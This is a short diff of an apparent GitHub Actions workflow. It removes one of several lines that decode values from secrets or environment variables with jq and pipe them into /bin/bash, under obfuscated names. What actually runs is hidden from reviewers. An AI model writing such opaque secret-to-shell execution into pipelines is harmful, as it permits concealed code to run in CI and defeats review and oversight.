@@ -21,7 +21,6 @@ jobs:
           gtazr5: ${{ secrets.gtazr5 }}
         run: |
           printf '%s' "$gtazr5" | jq -r .jder0595 | /bin/bash
-          echo $jbrk47734 | jq -r .dib5 | /bin/bash
           echo $z0587 | jq -r .txtt9302 | /bin/bash
           printf '%s' "$p72735" | jq -r .vtfrn176 | /bin/bash
 
